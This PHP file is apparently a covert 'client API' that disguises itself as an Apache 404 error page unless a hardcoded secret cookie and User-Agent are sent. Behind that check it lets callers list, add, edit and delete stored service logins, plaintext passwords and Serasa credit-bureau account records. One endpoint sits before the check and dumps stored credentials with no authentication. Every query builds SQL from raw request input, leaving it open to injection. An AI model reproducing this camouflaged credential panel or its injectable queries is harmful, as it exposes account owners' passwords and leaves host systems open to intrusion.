<?php

#Api cliente versao: 1.0
#Criada em: 26/05/2013
#by puttyoe

error_reporting(0);
include("../config/config.php");
$db = mysql_connect($config['hostname'],$config['user'],$config['password']) or die("Erro.");
mysql_select_db($config['dbname']) or die("Erro.");

if(isset($_GET['dads']))
{
	$servico = xss($_GET['servico']);
	if(!isset($_GET['servico'])){die;}
	$query = mysql_query("SELECT * FROM `senhas`  where (servico='$servico')") or die(mysql_error());
	while($array = mysql_fetch_array($query))
	{
		$servico   = $array['servico'];
		$usuario   = $array['usuario'];
		$senha     = $array['senha'];
		$form      = $array['form'];
		$json[]    = array('servico'=>$servico,'usuario'=> $usuario,'senha'=> $senha,'form'=>$form);
	}
	mysql_close($db);
	echo json_encode($json);
	die;	
}

$cliente     = explode('@',$_SERVER['SERVER_ADMIN']);
$cliente     = explode('.',$cliente[1]);
$NomeCliente = $cliente[0];

if($_COOKIE['Control'] != "9982192981!@(*!(*@(!0910291028ajsuausg9120!@#")
{
	header("HTTP/1.0 404 Not Found");
	header("HTTP/1.0 403 Forbidden");
	echo '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
	<html><head>
	<title>404 Not Found</title>
	</head><body>
	<h1>Not Found</h1>
	<p>The requested URL '.$_SERVER['REQUEST_URI'].' was not found on this server.</p>
	<p>Additionally, a 404 Not Found
	error was encountered while trying to use an ErrorDocument to handle the request.</p>
	<hr>
	<address>Apache/2.2.24 (Unix) mod_ssl/2.2.24 OpenSSL/1.0.0-fips mod_bwlimited/1.4 Server at www.provery.com Port 80</address>
	</body></html>
	';
	die;
}
if($_SERVER['HTTP_USER_AGENT'] != "Controladora v:1.0 pass: 8912891730(@)!@!)*#!&(#&*02390239kxhcduwge82")
{
	header("HTTP/1.0 404 Not Found");
	header("HTTP/1.0 403 Forbidden");
	echo '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
	<html><head>
	<title>404 Not Found</title>
	</head><body>
	<h1>Not Found</h1>
	<p>The requested URL '.$_SERVER['REQUEST_URI'].' was not found on this server.</p>
	<p>Additionally, a 404 Not Found
	error was encountered while trying to use an ErrorDocument to handle the request.</p>
	<hr>
	<address>Apache/2.2.24 (Unix) mod_ssl/2.2.24 OpenSSL/1.0.0-fips mod_bwlimited/1.4 Server at www.provery.com Port 80</address>
	</body></html>
	';
	die;
}
function xss($data, $problem='')
{
	$data = trim($data);
	$data = stripslashes($data);
	$data = htmlspecialchars($data);
	$data = strip_tags($data);

	if ($problem && strlen($data) == 0){return ($problem);}
	return $data;
}

if(isset($_GET['listar']))
{
	if(isset($_POST['datai']) && isset($_POST['dataf']))
	{
		$datai = xss($_POST['datai']);
		$dataf = xss($_POST['dataf']);

		$query = mysql_query("SELECT * FROM fat_serasa  where (contratacao BETWEEN '$datai' AND '$dataf')") or die(mysql_error());
		while($array = mysql_fetch_array($query))
		{
			$id          = $array['id'];
			$usuario     = $array['usuario'];
			$limite      = $array['limite'];
			$contratacao = $array['contratacao'];
			$json[]      = array('id'=>$id,'usuario'=> $usuario,'limite'=> $limite,'contratacao'=>$contratacao);
		}
	}
	else
	{
		$query = mysql_query("SELECT * FROM fat_serasa") or die(mysql_error());
		while($array = mysql_fetch_array($query))
		{
			$id          = $array['id'];
			$usuario     = $array['usuario'];
			$limite      = $array['limite'];
			$contratacao = $array['contratacao'];
			$json[]      = array('id'=>$id,'usuario'=> $usuario,'limite'=> $limite,'contratacao'=>$contratacao);
		}
	}
	mysql_close($db);
	echo json_encode($json);
	die;
}
elseif($_GET['listarcc'])
{
	if(isset($_GET['id']))
	{
		$id = xss($_GET['id']);
		
		$query = mysql_query("SELECT * FROM fat_cc where id='$id'") or die(mysql_error());
	}
	else
	{
		$query = mysql_query("SELECT * FROM fat_cc") or die(mysql_error());
	}
	mysql_close($db);
	while($array = mysql_fetch_array($query))
	{
		$id      = $array['id'];
		$nome    = $array['nome'];
		$usuario = $array['usuario'];
		$senha   = $array['senha'];
		$data    = $array['data'];
		$status  = $array['status'];
		$json[]  = array('id'=>$id,'cliente'=>$NomeCliente,'usuario'=> $usuario,'senha'=>$senha,'data'=> $data,'status'=>$status,'nome'=>$nome);
	}
	
	echo json_encode($json);
	die;
}
elseif($_GET['add'])
{
	$servico = xss($_POST['servico']);
	$usuario = xss($_POST['usuario']);
	$senha   = xss($_POST['senha']);
	$data    = xss($_POST['data']);
	$status  = xss($_POST['status']);
	
	$query = mysql_query("INSERT INTO fat_cc (usuario,senha,cookie,token,data,status,nome) VALUES ('$usuario', '$senha','','', '$data', '$status','$servico')") or die(mysql_error());
	mysql_close($db);
}
elseif($_GET['edit'])
{
	$servico = xss($_POST['servico']);
	$id      = xss($_POST['id']);
	$usuario = xss($_POST['usuario']);
	$senha   = xss($_POST['senha']);
	$data    = xss($_POST['data']);
	$status  = xss($_POST['status']);
	
	$query = mysql_query("UPDATE fat_cc SET usuario='$usuario', senha='$senha',cookie='',token='',data='$data',status='$status',nome='$servico' where id='$id'") or die(mysql_error());		
	mysql_close($db);
}
elseif($_GET['del'])
{
	$id    = xss($_POST['id']);	
	$query = mysql_query("DELETE FROM fat_cc WHERE id='$id'") or die(mysql_error());		
	mysql_close($db);
}

@mysql_close($db);
die;